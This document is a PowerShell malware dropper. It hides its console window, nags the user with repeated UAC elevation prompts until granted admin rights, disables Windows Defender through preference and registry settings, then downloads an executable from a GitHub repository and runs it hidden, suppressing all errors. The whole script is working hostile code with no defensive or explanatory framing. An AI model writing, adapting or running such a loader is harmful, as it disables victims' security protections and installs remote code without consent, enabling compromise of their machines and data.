# ===== HIDE WINDOW =====
try {
    Add-Type -Name W -Namespace C -MemberDefinition '[DllImport("Kernel32.dll")] public static extern IntPtr GetConsoleWindow();[DllImport("User32.dll")] public static extern bool ShowWindow(IntPtr h,int c);' -ErrorAction SilentlyContinue
    $w = [C.W]::GetConsoleWindow()
    if ($w -ne [IntPtr]::Zero) { [C.W]::ShowWindow($w, 0) | Out-Null }
} catch {}

# ===== ADMIN CHECK + ELEVATION =====
$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if (-not $isAdmin) {
    $tmp = Join-Path $env:TEMP "_svc.ps1"
    (iwr "https://github.com/analysisw/test/raw/refs/heads/main/test.ps1" -UseBasicParsing).Content | Out-File $tmp -Encoding UTF8 -Force
    while ($true) {
        $p = Start-Process powershell -Verb RunAs -PassThru -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$tmp`""
        if ($p -ne $null) { [Environment]::Exit(0) }
        Start-Sleep -Seconds 2
    }
}

Set-MpPreference -DisableRealtimeMonitoring $true
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1 -Force
New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "Real-Time Protection" -ErrorAction SilentlyContinue
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiVirus" -Value 1 -Force

# ===== DOWNLOAD + EXECUTE user.exe =====
$folder = $env:TEMP
$url = "https://github.com/analysisw/test/raw/refs/heads/main/Comand.exe"
$outFile = "$folder\Comand.exe"

try {
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    Invoke-WebRequest -Uri $url -OutFile $outFile -UseBasicParsing -ErrorAction Stop
    if (Test-Path $outFile) {
        $size = (Get-Item $outFile).Length
        if ($size -gt 1024) {
            Start-Process -FilePath $outFile -WindowStyle Hidden
        }
    }
} catch {}
